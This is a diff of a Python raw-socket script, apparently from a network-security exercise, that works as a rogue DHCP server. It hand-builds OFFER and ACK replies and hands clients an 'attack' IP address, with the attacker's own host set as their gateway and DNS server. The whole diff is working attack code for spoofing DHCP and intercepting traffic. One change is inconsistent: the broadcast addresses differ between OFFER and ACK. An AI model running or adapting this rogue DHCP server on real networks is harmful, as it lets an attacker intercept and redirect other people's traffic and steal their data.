@@ -5,9 +5,19 @@ import sys
 import netifaces
 
 global SERVER_IP
-SERVER_IP = b'\xc0\xa8\x64\x02'
 global DNS_IP
-DNS_IP = b'\x00\x08\x08\x08'
+
+SERVER_IP = b'\xc0\xa8\x0f\xad'
+#DNS_IP = b'\x08\x08\x08\x08'
+DNS_IP = b'\xc0\xa8\x0f\x61'
+
+global CLIENT_IP_ATTACK
+global CLIENT_BROADCAST
+global CHECKSUM_IP
+
+CLIENT_IP_ATTACK=  b'\xc0\xa8\x0f\x64'
+CLIENT_BROADCAST=b'\xc0\xa8\x0f\xff'
+CHECKSUM_IP=b'\xa9\x50'
 
 s = socket(AF_PACKET, SOCK_RAW)
 
@@ -18,7 +28,7 @@ s = socket(AF_PACKET, SOCK_RAW)
 #     get_mac = netifaces.ifaddresses(sys.argv[1])[netifaces.AF_LINK]
 #     print("this MAC= ", get_mac[0].get('addr'))
 #s.bind(('enp0s3', 0))
-s.bind(('enp0s8', 0))
+s.bind(('enp0s3', 0))
 
 src_addr = b'\x01\x02\x03\x04\x05\x06'#mac do nosso host
 dst_addr = b'\xff\xff\xff\xff\xff\xff'#
@@ -33,7 +43,7 @@ identification= b'\x00\x00'
 flags_offset= b'\x00\x00'
 ttl= b'\x40'# ou bytearray([64]).hex() converter ttl original
 procotol= b'\x11' #protocolo 17 - UDP 
-checksum = b'\x54\xfb' #offer exaple
+checksum = CHECKSUM_IP #offer exaple
 source_address= SERVER_IP
 destination_address= b'\xff\xff\xff\xff'
 ip_header = version_and_headerlength + qos + totalLength + identification + flags_offset + \
@@ -61,7 +71,7 @@ udp_header = udp_source_port + udo_destination_port + udp_length + udp_checksum
 
 
 def offer(transation_id, client_mac, magic_cookie):
-    print('>>>>OFFER<<<')
+    print('\n\nOFFER<<<<<<<<<<<<\n\n')
     #DHCP
     message_type=b'\x02' #reply
     hw_type=b'\x01'
@@ -72,7 +82,7 @@ def offer(transation_id, client_mac, magic_cookie):
     seconds_elapsed= b'\x00\x00'
     bootp_flags=b'\x80\x00'
     client_ip_address= b'\x00\x00\x00\x00'
-    your_ip_address=b'\xc0\xa8\x0f\xde' #ip que está sendo oferecido ao cliente
+    your_ip_address=CLIENT_IP_ATTACK #ip que está sendo oferecido ao cliente
     next_server_ip=b'\x00\x00\x00\x00'
     relay_agent_ip=b'\x00\x00\x00\x00'
     #client_mac=b'\x80\x00\x27\x41\x14\xec'#parametro vem da solicitacao
@@ -89,7 +99,7 @@ def offer(transation_id, client_mac, magic_cookie):
     renewal_time=b'\x3a\x04' + b'\x00\x01\xa5\xe0'
     rebinding_time = b'\x3b\x04' + b'\x00\x02\xe2\x48'
 
-    broadcast_address= b'\x1c\x04' +  b'\xc0\xa8\x0f\xff'
+    broadcast_address= b'\x1c\x04' +  b'\xc0\xa8\x64\xff'
     subnet_mask= b'\x01\x04' + b'\xff\xff\xff\x00'
     router= b'\x03\x04' +  SERVER_IP #ip do gateway da rede, no caso, nosso servidor DHCP/Server
     domain_name_server= b'\x06\x04' + DNS_IP #aqui vai o IP do nosso server
@@ -106,7 +116,7 @@ def offer(transation_id, client_mac, magic_cookie):
     s.send(ethernet_header + ip_header + udp_header + dhcp_packet)
 
 def ack(transation_id, client_mac, magic_cookie):
-    print('>>>>ACK<<<')
+    print('\n\nACK<<<<<<<<<<<<\n\n')
     #DHCP
     message_type=b'\x02' #reply
     hw_type=b'\x01'
@@ -117,7 +127,7 @@ def ack(transation_id, client_mac, magic_cookie):
     seconds_elapsed= b'\x00\x00'
     bootp_flags=b'\x80\x00'
     client_ip_address= b'\x00\x00\x00\x00'
-    your_ip_address=b'\xc0\xa8\x0f\xde' #ip que está sendo oferecido ao cliente
+    your_ip_address=CLIENT_IP_ATTACK #ip que está sendo oferecido ao cliente
     next_server_ip=b'\x00\x00\x00\x00'
     relay_agent_ip=b'\x00\x00\x00\x00'
     #client_mac=b'\x80\x00\x27\x41\x14\xec'#parametro vem da solicitacao
@@ -134,8 +144,8 @@ def ack(transation_id, client_mac, magic_cookie):
     renewal_time=b'\x3a\x04' + b'\x00\x01\xa5\xe0'
     rebinding_time = b'\x3b\x04' + b'\x00\x02\xe2\x48'
 
-    broadcast_address= b'\x1c\x04' +  b'\xc0\xa8\x0f\xff'
-    subnet_mask= b'\x01\x04' + b'\xff\xff\xff\x00'
+    broadcast_address= b'\x1c\x04' +  CLIENT_BROADCAST
+    subnet_mask= b'\x01\x04' + b'\xff\xff\xff\x00'#
     router= b'\x03\x04' +  SERVER_IP #ip do gateway da rede, no caso, nosso servidor DHCP/Server
     domain_name_server= b'\x06\x04' + DNS_IP #aqui vai o IP do nosso server
     netbios_tcpip_ns= b'\x2c\x04' + SERVER_IP
